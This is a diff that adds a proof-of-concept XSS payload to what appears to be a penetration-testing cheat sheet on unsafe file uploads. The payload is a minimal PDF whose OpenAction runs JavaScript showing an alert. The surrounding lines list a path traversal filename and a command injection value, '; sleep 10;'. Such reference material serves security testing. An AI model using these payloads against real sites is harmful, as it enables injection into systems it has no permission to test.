@@ -701,6 +701,16 @@ unsafe file upload
 - File Traversal e.g. `../../../tmp/lol.png`
 - Command Injection e.g. `; sleep 10;`
 
+For xss
+--------->>
+%PDF-1.7
+1 0 obj
+<< /Pages 1 0 R /OpenAction 2 0 R >>
+endobj
+2 0 obj
+<< /S /JavaScript /JS (app.alert("xss poc")) >>
+endobj
+trailer << /Root 1 0 R >>
 
 
 
